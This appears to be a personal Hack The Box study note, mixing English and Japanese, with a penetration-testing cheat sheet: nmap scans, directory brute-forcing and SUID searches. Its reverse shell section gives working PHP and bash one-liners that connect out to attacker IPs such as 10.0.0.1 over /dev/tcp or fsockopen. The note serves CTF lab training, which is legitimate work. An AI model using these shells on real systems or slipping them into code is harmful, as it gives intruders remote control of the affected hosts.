# HTB-Note
note about Hack The Box

## Virtual Box Setting

### Run GuestAddictionsCD

```Shell
cd /media/
sudo mount /dev/cdrom /media/cdrom1
cd /cdrom1
sudo ./VBoxLinuxAdditions.run 
reboot
```

### Open VPN

- Download ovpn file **for VIP account**

```Shell
sudo openvpn --config ./Desktop/yufujioka.ovpn
```

## CheatSheet

### nmap

- バージョン検出
```shell
nmap -sV rhost
```
- OS検出
```shell
nmap -O rhost
```
- OS 検出 + バージョン検出
```shell
nmap -A rhost
```
- ping 送らない
```shell
nmap -Pn rhost
```

#### nmap script engine

- Vulnerability 検出
```shell
nmap --script=vuln -p rport1,rport2 rhost
```

- DNS

### MSFvenom

- [MSFvenom ~ ペイロード早見表 ~](https://qiita.com/mr-wacker/items/0ec926951ffa5a4d197c)

### Directory Enumlation

- Gobuster options
  - [Gobuster Cheatsheet](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
  - quick play
```
gobuster dir -t 100 -u targetUrl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o outfile
```

- [ffuf](https://github.com/ffuf/ffuf)
  - quick play
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u targetUrl/FUZZ
```


### Reverse Shell

- receive
```
nc -lnvp 1234
```

- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc)
```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
```
  - Direct input
```php
php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
```

- PHP fsockopen
```php
<?php $s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");?>
```
  - Direct input
```php
php -r '$s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");'
```

- when i get "must be run from a terminal"
```python
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
```

### Privilege escalation

#### find SUID 

```shell
find / -perm -u=s -type f 2>/dev/null
```

### PowerShell

- whoami
```
$env:UserName
```
- 論理ドライブの一覧を表示
```
Get-PSDrive
```
- カレントドライブの移動
```
Set-Location C:
```

### Password Crack

- [Free Password Hash Cracker](https://crackstation.net/)
